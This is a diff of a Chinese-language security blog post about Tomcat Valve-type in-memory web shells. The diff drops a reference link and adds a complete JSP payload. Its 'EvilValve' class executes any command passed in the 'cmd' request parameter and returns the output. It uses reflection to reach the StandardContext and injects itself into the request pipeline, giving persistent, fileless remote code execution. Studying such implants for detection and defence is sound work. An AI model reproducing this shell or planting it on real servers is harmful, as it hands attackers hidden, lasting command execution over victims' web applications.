@@ -7,10 +7,6 @@ tags:
   - 内存马
   - Tomcat内存马
 ---
--   参考: [Java内存马系列-06-Tomcat 之 Valve 型内存马 | Drunkbaby’s Blog](https://drun1baby.github.io/2022/09/07/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-06-Tomcat-%E4%B9%8B-Valve-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/)
-
----
-
 ## 0x01 前言
 
 Valve 内存马与之前的三种内存马区别还是有点大的，之前内存马是放在 Web 请求之中的，Listener —-> Filter —-> Servlet 的流程，但是 Valve 内存马是在 Pipeline 之中的一个流程，可以说区别是有点小大了。
@@ -236,7 +232,51 @@ class ValveShell extends ValveBase{
 </details>
 
 ```java
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>
+<%@ page import="org.apache.catalina.core.StandardContext" %>
+<%@ page import="javax.servlet.*" %>
+<%@ page import="java.io.IOException" %>
+<%@ page import="java.lang.reflect.Field" %>
+<%@ page import="org.apache.catalina.connector.Request" %>
+<%@ page import="org.apache.catalina.valves.ValveBase" %>
+<%@ page import="org.apache.catalina.connector.Response" %>
+<%@ page import="java.util.Scanner" %>
 
+<%!
+    // 恶意 Valve 实现
+    public class EvilValve extends ValveBase {
+        @Override
+        public void invoke(Request request, Response response) throws IOException, ServletException {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null) {
+                try {
+                    Process p = Runtime.getRuntime().exec(cmd);
+                    Scanner s = new Scanner(p.getInputStream()).useDelimiter("\\A");
+                    String result = s.hasNext() ? s.next() : "";
+                    response.getWriter().write(result);
+                    // 注意：不要调用 getNext().invoke()，直接返回
+                    return;
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+            // 正常请求放行
+            getNext().invoke(request, response);
+        }
+    }
+%>
+
+<%
+    // 更简单的方法 获取StandardContext
+    Field reqF = request.getClass().getDeclaredField("request");
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+
+    standardContext.getPipeline().addValve(new EvilValve());
+
+    out.println("inject success");
+%>
 ```
 
 ## 0x05 小结
